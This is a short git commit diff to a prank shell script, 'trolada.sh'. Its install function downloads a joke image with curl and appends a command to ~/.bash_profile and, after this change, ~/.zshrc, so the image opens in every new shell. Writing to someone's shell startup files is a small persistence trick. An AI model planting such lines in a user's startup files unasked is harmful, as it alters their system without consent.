b51d226645a33555abd866c18d19e2072a07826a
Rafs <rafaelacorsi@gmail.com>
2017-08-03 15:21:50 -0300

    oss

--- trolada.sh
+++ trolada.sh
@@ -1,7 +1,7 @@
 install() {
 	curl -L#o /var/tmp/lerolero.png http://s2.glbimg.com/1CtQVBZw4-FKoZu5NbzDVp_Ttos=/i.glbimg.com/og/ig/infoglobo1/f/original/2016/09/27/bode.jpg
 	echo "open /var/tmp/lerolero.png" >> ~/.bash_profile
-        echo "open /var/tmp/lerolero.png" >> ~/.bashrc
+        echo "open /var/tmp/lerolero.png" >> ~/.zshrc
         source ~/.bash_profile
 }
 
